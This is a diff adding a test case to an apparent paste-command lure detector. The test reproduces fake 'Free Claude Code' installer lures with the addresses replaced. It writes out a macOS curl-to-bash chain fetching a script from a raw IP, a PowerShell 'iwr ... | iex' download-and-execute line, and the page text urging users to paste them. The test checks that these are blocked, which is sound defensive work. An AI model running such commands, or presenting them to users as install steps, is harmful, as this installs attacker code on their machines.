@@ -229,3 +229,16 @@ test("download without execution is never blocked by the model alone", () => {
     assert.notEqual(analyze(t, { programmatic: true }).verdict, "block", t);
   }
 });
+
+test("lures from the 'Free Claude Code' investigation (structure preserved, addresses replaced)", () => {
+  const pastePage = "Claude Code free installer. Windows: open PowerShell and run the command below. macOS: open Terminal and paste this command.";
+  const mac = 'curl -fsSL https://bun.sh/install | bash && /bin/bash -c "$(curl -fsSL http://198.51.100.249/9rmoz4cqi58)"';
+  const winIex = 'iwr "http://soft-storage.example.top/worker?=7341210743/ai-plugin" -UseBasicParsing | iex';
+  const winFetch = 'iwr "http://soft-storage.example.top/worker?=7341210743/ai-plugin" -UseBasicParsing';
+  for (const ctx of [{ programmatic: false }, { programmatic: false, pageText: pastePage }, { programmatic: true, visibleOnPage: true, trigger: "Copy" }]) {
+    assert.equal(analyze(mac, ctx).verdict, "block", "macOS chain: a real installer in front must not excuse the raw-IP stage");
+    assert.equal(analyze(winIex, ctx).verdict, "block", "Windows download | iex");
+  }
+  assert.equal(analyze(winFetch, { programmatic: false, pageText: pastePage }).verdict, "block");
+  assert.equal(analyze(winFetch, { programmatic: false }).verdict, "warn");
+});
